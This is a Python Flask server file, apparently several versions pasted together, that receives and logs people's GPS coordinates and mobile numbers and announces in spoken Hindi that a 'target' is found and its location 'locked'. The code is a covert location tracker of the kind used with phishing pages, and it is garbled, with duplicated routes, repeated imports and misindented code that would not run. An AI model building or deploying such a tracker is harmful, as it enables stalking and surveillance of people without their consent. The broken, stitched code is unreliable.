from flask import Flask, render_template, request, jsonify
import datetime, os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')  # Keep your existing homepage

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    with open('logs.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {data}\n")
    os.system('espeak -v hi "Target mil gaya. Coordinates locked."')
    return {'status': 'logged'}

# 🆕 GPS Tracker Route
@app.route('/get_location', methods=['POST'])
def get_location():
    data = request.json
    lat = data['latitude']
    lon = data['longitude']
    with open("logs.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - [GPS] Latitude: {lat}, Longitude: {lon}\n")
    os.system('espeak -v hi "GPS se target prapt ho gaya. Sthal sanket lock kiya ja raha hai."')
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
@app.route('/log', methods=['POST'])
def log():
    data = request.json
    mobile = data.get('mobile')
    lat = data.get('lat')
    lon = data.get('lon')
    with open('logs.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - Mobile: {mobile} | Latitude: {lat}, Longitude: {lon}\n")
    os.system('espeak -v hi "Mobile number se target prapt ho gaya. Location lock kiya ja raha hai."')
    return {'status': 'logged'}
from flask import Flask, request
import os
import datetime

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    mobile = data.get('mobile', 'Unknown')
    lat = data.get('lat')
    lon = data.get('lon')

    if lat and lon:
        timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        with open('logs.txt', 'a') as f:
            f.write(f"{timestamp} - Mobile: {mobile} | Latitude: {lat}, Longitude: {lon}\n")
        os.system('espeak -v hi "Mobile number se target prapt ho gaya. Location lock kiya ja raha hai."')
        return {'status': 'logged'}
    else:
        os.system('espeak -v hi "Location data prapt nahi hua. Target se sampark toot gaya."')
        return {'status': 'error', 'message': 'Location data missing'}, 400
        if __name__ == "__main__":
    app.run(debug=True, port=5000)
